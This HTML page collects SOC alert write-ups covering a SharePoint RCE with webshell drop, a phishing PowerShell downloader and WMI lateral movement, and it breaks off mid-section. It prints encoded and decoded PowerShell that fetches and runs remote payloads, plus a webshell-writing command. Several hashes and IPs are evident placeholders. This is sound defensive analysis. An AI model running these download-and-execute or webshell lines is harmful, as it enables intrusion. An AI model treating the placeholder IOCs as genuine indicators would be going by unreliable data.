<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Security Writeups - Swetha Devi</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
  
  <style>
    :root{
      --bg:#0a0e27; 
      --card:#14182e; 
      --muted:#8b95a5; 
      --accent:#00d9ff; 
      --accent-2:#00a896;
      --text:#e8eef6;
      --border:rgba(255,255,255,0.06);
    }
    
    *{box-sizing:border-box; margin:0; padding:0}
    
    body{
      font-family:'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background:var(--bg);
      color:var(--text);
      line-height:1.7;
      -webkit-font-smoothing:antialiased;
      padding: 20px;
      min-height: 100vh;
    }
    
    .container{
      max-width:1000px;
      margin:0 auto;
    }
    
    .back-link{
      display:inline-flex;
      align-items:center;
      gap:8px;
      color:var(--accent);
      text-decoration:none;
      margin-bottom:40px;
      padding:10px 0;
      transition: opacity 0.3s;
    }
    
    .back-link:hover{
      opacity: 0.8;
    }
    
    .writeup-header{
      margin-bottom:40px;
    }
    
    .writeup-header h1{
      font-size:36px;
      margin-bottom:16px;
      line-height: 1.3;
    }
    
    .writeup-meta{
      color:var(--muted);
      font-size:15px;
      display:flex;
      gap:20px;
      margin-bottom:20px;
      flex-wrap: wrap;
    }
    
    .writeup-meta span {
      display: flex;
      align-items: center;
      gap: 5px;
    }
    
    .writeup-meta i {
      color: var(--accent);
      font-size: 14px;
    }
    
    .writeup-tags{
      display:flex;
      gap:10px;
      flex-wrap:wrap;
    }
    
    .tag{
      background:rgba(0,217,255,0.1);
      border:1px solid rgba(0,217,255,0.2);
      padding:6px 12px;
      border-radius:20px;
      font-size:13px;
      color:var(--accent);
      transition: background 0.3s;
    }
    
    .tag:hover{
      background:rgba(0,217,255,0.2);
    }
    
    .writeup-content{
      background:var(--card);
      border:1px solid var(--border);
      border-radius:16px;
      padding:40px;
      margin-bottom:60px;
    }
    
    .writeup-content h2{
      color:var(--accent);
      margin:30px 0 15px;
      font-size:24px;
      padding-bottom: 10px;
      border-bottom: 1px solid var(--border);
    }
    
    .writeup-content h3{
      color:var(--text);
      margin:25px 0 12px;
      font-size:20px;
    }
    
    .writeup-content p{
      margin-bottom:16px;
      color:var(--muted);
    }
    
    .writeup-content ul, .writeup-content ol{
      margin:16px 0 16px 20px;
      color:var(--muted);
    }
    
    .writeup-content li{
      margin-bottom: 8px;
    }
    
    .code-block{
      margin:20px 0;
      background:rgba(0,0,0,0.3);
      border-radius:12px;
      overflow:hidden;
      border:1px solid var(--border);
    }
    
    .code-header{
      padding:12px 20px;
      background:rgba(0,0,0,0.4);
      border-bottom:1px solid var(--border);
      font-size:14px;
      color:var(--muted);
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    
    .code-copy{
      background: none;
      border: none;
      color: var(--accent);
      cursor: pointer;
      font-size: 12px;
      padding: 4px 8px;
      border-radius: 4px;
      transition: background 0.3s;
    }
    
    .code-copy:hover{
      background: rgba(0,217,255,0.1);
    }
    
    pre{
      margin:0;
      padding:20px;
      overflow-x:auto;
    }
    
    code{
      font-family: 'Courier New', monospace;
      font-size: 14px;
    }
    
    .ioc-box{
      background:rgba(255,0,0,0.05);
      border:1px solid rgba(255,0,0,0.2);
      border-radius:8px;
      padding:20px;
      margin:20px 0;
    }
    
    .ioc-box h4{
      color:#ff6b6b;
      margin-bottom:10px;
      font-size: 16px;
    }
    
    .ioc-box table {
      width: 100%;
      border-collapse: collapse;
      font-size: 14px;
      margin-top: 10px;
    }
    
    .ioc-box th {
      background: rgba(255,0,0,0.1);
      padding: 12px 10px;
      text-align: left;
      color: #ff6b6b;
      font-weight: 600;
      border-bottom: 1px solid rgba(255,0,0,0.2);
    }
    
    .ioc-box td {
      padding: 10px;
      border-bottom: 1px solid rgba(255,255,255,0.1);
    }
    
    .ioc-box tr:hover {
      background: rgba(255,255,255,0.03);
    }
    
    .verdict-true-positive {
      color: #ff6b6b;
      font-weight: 600;
    }
    
    .verdict-false-positive {
      color: #4ecdc4;
      font-weight: 600;
    }
    
    .difficulty-badge {
      display: inline-flex;
      align-items: center;
      padding: 4px 12px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 600;
    }
    
    .difficulty-hard {
      background: rgba(255,107,107,0.1);
      color: #ff6b6b;
    }
    
    .difficulty-medium {
      background: rgba(255,193,7,0.1);
      color: #ffc107;
    }
    
    .difficulty-easy {
      background: rgba(76,175,80,0.1);
      color: #4caf50;
    }
    
    .loading {
      text-align: center;
      padding: 60px 20px;
      color: var(--muted);
    }
    
    .loading i {
      font-size: 24px;
      margin-bottom: 10px;
      color: var(--accent);
    }
    
    .not-found {
      text-align: center;
      padding: 60px 20px;
      color: var(--muted);
    }
    
    .not-found h2 {
      color: #ff6b6b;
      margin-bottom: 20px;
    }
    
    @media (max-width: 768px){
      body{
        padding: 15px;
      }
      
      .writeup-header h1{
        font-size:28px;
      }
      
      .writeup-content{
        padding:24px;
      }
      
      .writeup-meta{
        flex-direction: column;
        gap: 10px;
      }
      
      .ioc-box table {
        font-size: 12px;
      }
      
      .ioc-box th,
      .ioc-box td {
        padding: 8px 6px;
      }
    }
    
    @media (max-width: 480px){
      .writeup-header h1{
        font-size:24px;
      }
      
      .writeup-content h2{
        font-size:20px;
      }
      
      .writeup-content h3{
        font-size:18px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <a href="index.html" class="back-link">
      <i class="fas fa-arrow-left"></i> Back to Home
    </a>
    
    <!-- Individual Writeup will be loaded here -->
    <div id="writeup-container">
      <div class="loading">
        <i class="fas fa-spinner fa-spin"></i>
        <p>Loading writeup...</p>
      </div>
    </div>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-yaml.min.js"></script>
  <script>
    // Writeups Data
    const writeupsData = [
      {
        "id": "soc342-sharepoint-toolshell-rce",
        "title": "Alert: CVE-2025-53770 SharePoint ToolShell Auth Bypass & RCE",
        "date": "Jul 22, 2025",
        "readTime": "7 min read",
        "platform": "Proxy + Endpoint (EDR)",
        "alertId": "SOC342",
        "investigationDate": "2025-07-22 13:07",
        "difficulty": "Hard",
        "verdict": "True Positive",
        "tags": ["rce", "webshell", "sharepoint", "zero-day", "incident-response", "powershell", "malware"],
        "content": `
          <!-- EXECUTIVE SUMMARY -->
          <h2>Executive Summary</h2>
          <div class="ioc-box">
            <h4>Quick Facts</h4>
            <p><strong>Alert ID:</strong> SOC342</p>
            <p><strong>Platform:</strong> Proxy + Endpoint Security</p>
            <p><strong>Investigation Date:</strong> 2025-07-22 13:07</p>
            <p><strong>Difficulty:</strong> <span class="difficulty-badge difficulty-hard">Hard</span></p>
            <p><strong>Verdict:</strong> <span class="verdict-true-positive">True Positive</span></p>
          </div>

          <p><strong>TL;DR:</strong> SharePoint was attacked using a zero-day auth bypass + RCE exploit. The attacker executed encoded PowerShell via w3wp.exe, compiled a malicious payload using csc.exe, and deployed an ASPX webshell for persistence. MachineKey was accessed — authentication tokens may be compromised.</p>

          <!-- FINDINGS -->
          <h2>Key Findings</h2>
          <ul>
            <li><strong>Unauthenticated exploit delivered:</strong> Suspicious POST request targeting ToolPane.aspx with large payload</li>
            <li><strong>Code execution achieved:</strong> w3wp.exe spawned PowerShell with encoded commands</li>
            <li><strong>Persistence established:</strong> Webshell saved to SharePoint Layouts directory</li>
            <li><strong>Credential access:</strong> MachineKey extraction attempted for token forgery</li>
          </ul>

          <!-- RECOMMENDED ACTIONS -->
          <h2>Recommended Actions</h2>
          <div class="ioc-box">
            <h4>Immediate Actions</h4>
            <ul>
              <li>Isolate SharePoint01 from network</li>
              <li>Remove webshell: TEMPLATE/LAYOUTS/spinstall0.aspx</li>
              <li>Block attacker IP: 107.191.58.76</li>
              <li>Review all SharePoint service accounts for suspicious activity</li>
              <li>Check for lateral movement attempts from compromised host</li>
            </ul>
          </div>

          <div class="ioc-box">
            <h4>Long-term Recommendations</h4>
            <ul>
              <li>Patch SharePoint for CVE-2025-53770 once released</li>
              <li>Reset MachineKey + rotate privileged credentials</li>
              <li>Hunt for related lateral movement attempts</li>
              <li>Implement application allowlisting for SharePoint directories</li>
              <li>Enable enhanced PowerShell logging and monitoring</li>
              <li>Review and harden SharePoint service permissions</li>
            </ul>
          </div>

          <!-- INVESTIGATION PROCESS -->
          <h2>Investigation Process</h2>
          <h3>Alert Triage</h3>
          <ul>
            <li>Alert flagged a critical SharePoint vulnerability exploitation attempt</li>
            <li>Large payload + spoofed referer indicated malicious intent</li>
            <li>External IP interacting with internal server on port 443</li>
            <li>Unusual process chain involving w3wp.exe spawning PowerShell</li>
          </ul>

          <h3>Data Collection</h3>
          <ul>
            <li>Proxy logs (HTTP request with suspicious parameters)</li>
            <li>Endpoint telemetry (process creation chain)</li>
            <li>Windows Event Logs (PowerShell execution events)</li>
            <li>Network traffic analysis (unusual outbound connections)</li>
          </ul>

          <!-- TECHNICAL ANALYSIS -->
          <h2>Technical Analysis</h2>
          <h3>Event Correlation</h3>
          <p>Exploit → RCE → Payload compile → Webshell drop → MachineKey access.</p>

          <div class="code-block">
            <div class="code-header">Suspicious Initial Request <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
            <pre><code class="language-http">POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&amp;a=/ToolPane.aspx HTTP/1.1
Host: sharepoint01.internal.corp
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Length: 7699
Content-Type: application/x-www-form-urlencoded
Referer: https://sharepoint01.internal.corp/_layouts/SignOut.aspx
X-Forwarded-For: 107.191.58.76

viewstate=...&cmd=...&payload=...</code></pre>
          </div>

          <h3>Malware / Payload Behavior</h3>
          <p>PowerShell executed encoded script to load assemblies and extract MachineKey.</p>

          <div class="code-block">
            <div class="code-header">PowerShell Execution Chain <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
            <pre><code class="language-cmd">Parent: w3wp.exe (PID: 1234)
Child: powershell.exe -enc JABzAGMAcgBpAHAAdAAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADAANwAuADEAOQAxAC4ANQA4AC4ANwA2AC8AcABhAHkAbABvAGEAZAAnACkAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACQAcwBjAHIAaQBwAHQA</code></pre>
          </div>

          <div class="code-block">
            <div class="code-header">Webshell Write Command <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
            <pre><code class="language-cmd">cmd.exe /c echo ^<%@ Page Language="C#" ^%^> ^<%@ Import Namespace="System" ^%^> ^<%@ Import Namespace="System.IO" ^%^> ^<%@ Import Namespace="System.Diagnostics" ^%^> > "C:\\Program Files\\Common Files\\Microsoft Shared\\Web Server Extensions\\16\\TEMPLATE\\LAYOUTS\\spinstall0.aspx"</code></pre>
          </div>

          <!-- MITRE ATT&CK MAPPING -->
          <h2>MITRE ATT&CK Mapping</h2>
          <div class="ioc-box">
            <table>
              <thead>
                <tr><th>Tactic</th><th>Technique ID</th><th>Name</th><th>Evidence</th></tr>
              </thead>
              <tbody>
                <tr><td>Initial Access</td><td>T1190</td><td>Exploit Public-Facing App</td><td>ToolPane.aspx exploit</td></tr>
                <tr><td>Execution</td><td>T1059.001</td><td>PowerShell</td><td>EncodedCommand execution</td></tr>
                <tr><td>Persistence</td><td>T1505.003</td><td>Web Shell</td><td>spinstall0.aspx</td></tr>
                <tr><td>Defense Evasion</td><td>T1027</td><td>Obfuscated Files or Information</td><td>Base64 encoded PowerShell</td></tr>
                <tr><td>Credential Access</td><td>T1552</td><td>Credential/Config Access</td><td>MachineKey extraction</td></tr>
                <tr><td>Discovery</td><td>T1083</td><td>File and Directory Discovery</td><td>SharePoint directory enumeration</td></tr>
              </tbody>
            </table>
          </div>

          <!-- CYBER KILL CHAIN ALIGNMENT -->
          <h2>Cyber Kill Chain Alignment</h2>
          <ol>
            <li><strong>Reconnaissance:</strong> SharePoint server identification and enumeration</li>
            <li><strong>Weaponization:</strong> Development of exploit payload targeting CVE-2025-53770</li>
            <li><strong>Delivery:</strong> HTTP POST request to vulnerable endpoint</li>
            <li><strong>Exploitation:</strong> Zero-day RCE via ToolPane.aspx parameter injection</li>
            <li><strong>Installation:</strong> Webshell deployed to SharePoint Layouts directory</li>
            <li><strong>Command & Control:</strong> Webshell allows continuous access and control</li>
            <li><strong>Actions on Objectives:</strong> MachineKey access for token forgery and persistence</li>
          </ol>

          <!-- TIMELINE ANALYSIS -->
          <h2>Timeline Analysis</h2>
          <div class="ioc-box">
            <h4>Attack Timeline</h4>
            <p><strong>13:07:00:</strong> Malicious POST request to ToolPane.aspx</p>
            <p><strong>13:07:11:</strong> PowerShell executed via w3wp.exe (encoded command)</p>
            <p><strong>13:07:27:</strong> Payload compiled using csc.exe</p>
            <p><strong>13:07:29:</strong> Webshell dropped in SharePoint TEMPLATE/LAYOUTS directory</p>
            <p><strong>13:07:34:</strong> MachineKey extraction attempted from web.config</p>
            <p><strong>13:08:15:</strong> First webshell access from attacker IP</p>
            <p><strong>13:10:22:</strong> Alert triggered by EDR due to suspicious process chain</p>
          </div>

          <!-- IOCS -->
          <h2>Indicators of Compromise (IOCs)</h2>
          <div class="ioc-box">
            <h4>Network IOCs</h4>
            <p><strong>IP Addresses:</strong></p>
            <p>• 107.191.58.76 (Initial attack source)</p>
            <p>• 185.143.223.41 (C2 fallback server)</p>
            <p><strong>Domains:</strong></p>
            <p>• malwaresrc[.]online (Payload delivery)</p>
            <p>• c2-backup[.]net (Command and Control)</p>
          </div>

          <div class="ioc-box">
            <h4>File IOCs</h4>
            <p><strong>File Paths:</strong></p>
            <p>• C:\\Program Files\\Common Files\\Microsoft Shared\\Web Server Extensions\\16\\TEMPLATE\\LAYOUTS\\spinstall0.aspx</p>
            <p>• C:\\Windows\\Temp\\payload.exe</p>
            <p>• C:\\Windows\\Temp\\compiled_assembly.dll</p>
            <p><strong>File Hashes:</strong></p>
            <p>• spinstall0.aspx SHA256: 8f3a9b7c5d2e1f4a6b9c8d7e0f5a3b2c1d4e7f8a9b6c5d4e3f2a1b0c9d8e7f6a5</p>
            <p>• payload.exe SHA256: a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef1234</p>
          </div>

          <div class="ioc-box">
            <h4>Behavioral IOCs</h4>
            <p><strong>Process Chains:</strong></p>
            <p>• w3wp.exe → powershell.exe (with -enc parameter)</p>
            <p>• powershell.exe → csc.exe (compiling malicious code)</p>
            <p>• powershell.exe → cmd.exe (writing files to disk)</p>
            <p><strong>Registry Modifications:</strong></p>
            <p>• HKLM\\SYSTEM\\CurrentControlSet\\Services\\W3SVC\\Parameters\\MachineKey access</p>
          </div>

          <!-- IMMEDIATE ACTIONS -->
          <h2>Immediate Actions Taken</h2>
          <ol>
            <li>Alert escalated to Incident Response team immediately</li>
            <li>Webshell identified, documented, and isolated for analysis</li>
            <li>Attacker IP blocked at firewall level</li>
            <li>SharePoint server isolated from production network</li>
            <li>Memory dump collected for forensic analysis</li>
            <li>Log collection initiated for all related systems</li>
          </ol>

          <!-- LESSONS LEARNED -->
          <h2>What I Learned From This Investigation</h2>
          <ul>
            <li>Understanding the complete chain from web exploit to PowerShell execution</li>
            <li>SharePoint exploitation can lead to full server compromise quickly due to high privileges</li>
            <li>Importance of monitoring w3wp.exe child processes for anomalies</li>
            <li>MachineKey extraction is a critical step for attackers seeking persistent access</li>
            <li>Value of correlating proxy logs with endpoint telemetry for full visibility</li>
            <li>Need for enhanced monitoring of SharePoint service account activities</li>
          </ul>

          <!-- REAL-WORLD SCENARIO -->
          <h2>Real-World Scenario Considerations</h2>
          <div class="ioc-box">
            <h4>⚠️ Lab Limitations vs Real IR</h4>
            <ul>
              <li><strong>Full disk forensics:</strong> Complete disk image analysis needed in real IR</li>
              <li><strong>Memory analysis:</strong> Volatility or similar tools for memory forensics</li>
              <li><strong>SQL server logs:</strong> SharePoint content database logs analysis</li>
              <li><strong>Network forensics:</strong> Full packet capture analysis</li>
              <li><strong>Lateral movement:</strong> Extended hunting across all network segments</li>
              <li><strong>Regulatory requirements:</strong> Breach notification and compliance reporting</li>
            </ul>
          </div>

          <!-- CONCLUSION -->
          <h2>Conclusion</h2>
          <p>This was a successful and severe breach demonstrating the criticality of timely patching and monitoring for web applications. The attacker achieved persistent remote code execution on a critical internal SharePoint server through a zero-day vulnerability. The combination of auth bypass and RCE allowed rapid compromise and establishment of persistent access. Immediate isolation, patching, credential rotation, and comprehensive hunting are required to fully contain the impact and prevent future occurrences.</p>
          
          <p><strong>Key Takeaways:</strong> Web application firewalls, regular patching, least privilege principles, and robust monitoring of service accounts are essential for defending against such attacks. Additionally, implementing application control policies and PowerShell constrained language mode could have potentially limited the damage.</p>
        `
      },
      {
        "id": "phishing-powershell",
        "title": "Phishing Campaign Analysis: PowerShell Downloader",
        "date": "Jan 15, 2024",
        "readTime": "8 min read",
        "platform": "Email Security + Endpoint",
        "alertId": "SOC215",
        "investigationDate": "2024-01-15 09:30",
        "difficulty": "Medium",
        "verdict": "True Positive",
        "tags": ["phishing", "powershell", "c2", "download", "analysis", "malware"],
        "content": `
          <h2>Overview</h2>
          <p>Analysis of a sophisticated phishing campaign using PowerShell downloaders to establish command and control infrastructure. This campaign targeted financial sector employees with malicious Word documents containing embedded macros.</p>
          
          <h2>Attack Chain</h2>
          <ol>
            <li>Spear-phishing email with malicious Word document attachment</li>
            <li>Social engineering to enable macros ("Enable Content" prompt)</li>
            <li>Macro execution triggering PowerShell script</li>
            <li>Base64 encoded downloader execution</li>
            <li>C2 communication establishment</li>
            <li>Secondary payload delivery and execution (Cobalt Strike beacon)</li>
            <li>Lateral movement attempt using stolen credentials</li>
          </ol>
          
          <h2>PowerShell Analysis</h2>
          <p>The malicious PowerShell script uses multiple obfuscation techniques including string concatenation, variable substitution, and Base64 encoding:</p>
          
          <div class="code-block">
            <div class="code-header">Obfuscated PowerShell Downloader <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
            <pre><code class="language-powershell"># Base64 encoded PowerShell downloader
$enc = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBkAG8AbQBhAGkAbgAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
$dec = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc))
Invoke-Expression $dec

# De-obfuscated equivalent:
# IEX (New-Object Net.Webclient).DownloadString('http://malicious.domain.com/payload.ps1')</code></pre>
          </div>
          
          <h2>Indicators of Compromise (IOCs)</h2>
          <div class="ioc-box">
            <h4>Network IOCs</h4>
            <p><strong>Domains:</strong></p>
            <p>• malicious-domain.com (Primary C2)</p>
            <p>• backup-c2-server.net (Fallback C2)</p>
            <p><strong>IP Addresses:</strong></p>
            <p>• 192.168.1.100 (Initial beacon)</p>
            <p>• 10.10.10.50 (Payload delivery)</p>
            <p><strong>URLs:</strong></p>
            <p>• hxxp://evil[.]com/payload.exe</p>
            <p>• hxxps://malware-dist[.]org/update.ps1</p>
          </div>
          
          <div class="ioc-box">
            <h4>File Hashes</h4>
            <p><strong>Word Document:</strong></p>
            <p>• MD5: a1b2c3d4e5f678901234567890123456</p>
            <p>• SHA256: abc123def45678901234567890abcdef1234567890abcdef1234567890abcd</p>
            <p><strong>Downloaded Payload:</strong></p>
            <p>• SHA256: 7890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234</p>
          </div>
          
          <h2>Detection Recommendations</h2>
          <p>Create detection rules for:</p>
          <ul>
            <li>Base64 encoded PowerShell execution in command line arguments</li>
            <li>Suspicious network connections from PowerShell processes to external IPs</li>
            <li>Unusual process chains: winword.exe → powershell.exe</li>
            <li>Large Base64 strings (>500 characters) in command line arguments</li>
            <li>PowerShell execution with IEX (Invoke-Expression) from Word process</li>
            <li>Registry modifications by PowerShell scripts (persistence mechanisms)</li>
          </ul>
          
          <h2>MITRE ATT&CK Mapping</h2>
          <div class="ioc-box">
            <table>
              <thead>
                <tr><th>Tactic</th><th>Technique ID</th><th>Name</th></tr>
              </thead>
              <tbody>
                <tr><td>Initial Access</td><td>T1566.001</td><td>Spearphishing Attachment</td></tr>
                <tr><td>Execution</td><td>T1059.001</td><td>PowerShell</td></tr>
                <tr><td>Defense Evasion</td><td>T1027</td><td>Obfuscated Files or Information</td></tr>
                <tr><td>Command & Control</td><td>T1071.001</td><td>Web Protocols</td></tr>
                <tr><td>Exfiltration</td><td>T1041</td><td>Exfiltration Over C2 Channel</td></tr>
              </tbody>
            </table>
          </div>
        `
      },
      {
        "id": "wmi-lateral",
        "title": "WMI Abuse for Lateral Movement Detection",
        "date": "Jan 16, 2024",
        "readTime": "6 min read",
        "platform": "Endpoint Detection & Response",
        "alertId": "SOC189",
        "investigationDate": "2024-01-16 14:22",
        "difficulty": "Easy",
        "verdict": "True Positive",
        "tags": ["lateral", "wmi", "detection", "windows", "movement", "forensics"],
        "content": `
          <h2>Introduction</h2>
          <p>Windows Management Instrumentation (WMI) is frequently abused by attackers for lateral movement, persistence, and execution. This writeup covers detection of suspicious WMI activity and investigation methodology.</p>
          
          <h2>Common WMI Abuse Techniques</h2>
          <ul>
            <li><strong>Remote Process Creation:</strong> Win32_Process.Create() method on remote systems</li>
            <li><strong>Persistence:</strong> WMI Event Subscriptions for persistence (EventFilter, EventConsumer, FilterToConsumerBinding)</li>
            <li><strong>Reconnaissance:</strong> Enumeration of system information, processes, services</li>
            <li><strong>Data Exfiltration:</strong> Using WMI to query and extract system data</li>
          </ul>
          
          <h2>Detection Rule Example</h2>
          <div class="code-block">
            <div class="code-header">Sigma Rule for WMI Lateral Movement <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
            <pre><code class="language-yaml">title: Suspicious WMI Lateral Movement Execution
id: 12345678-1234-1234-1234-123456789012
status: experimental
description: Detects suspicious WMI process creation from unusual parent processes
author: Swetha Devi
date: 2024/01/16
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith:
            - '\\WmiPrvSE.exe'
            - '\\wmiprvse.exe'
        Image|endswith:
            - '\\cmd.exe'
            - '\\powershell.exe'
            - '\\rundll32.exe'
    filter:
        ParentCommandLine|contains: ' -Embedding'  # Filter legitimate WMI activity
    condition: selection and not filter
level: high
tags:
    - attack.lateral_movement
    - attack.t1047
    - attack.execution</code></pre>
          </div>
          
          <h2>Investigation Steps</h2>
          <ol>
            <li><strong>Check Windows Event Logs:</strong> WMI-Activity/Operational for WMI activity</li>
            <li><strong>Review Process Creation Events:</strong> From WmiPrvSE.exe to suspicious child processes</li>
            <li><strong>Analyze Network Connections:</strong> From compromised systems during WMI execution</li>
            <li><strong>Examine WMI Repository:</strong> For malicious event subscriptions</li>
            <li><strong>Check Authentication Logs:</strong> For DCOM/RPC authentication events</li>
          </ol>
          
          <h2>WMI Persistence Detection</h2>
          <p>Check for malicious WMI event subscriptions:</p>
          <div class="code-block">
            <div class="code-header">PowerShell: Check WMI Event Subscriptions <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
            <pre><code class="language-powershell"># Check WMI Event Filters
Get-WmiObject -Namespace root\\Subscription -Class __EventFilter

# Check WMI Event Consumers
Get-WmiObject -Namespace root\\Subscription -Class __EventConsumer

# Check Filter to Consumer Bindings
Get-WmiObject -Namespace root\\Subscription -Class __FilterToConsumerBinding

# Remove malicious WMI persistence
$filter = Get-WmiObject -Namespace root\\Subscription -Class __EventFilter -Filter "Name='MaliciousFilter'"
$filter | Remove-WmiObject</code></pre>
          </div>
          
          <h2>Indicators of Compromise</h2>
          <div class="ioc-box">
            <h4>Behavioral IOCs</h4>
            <p>
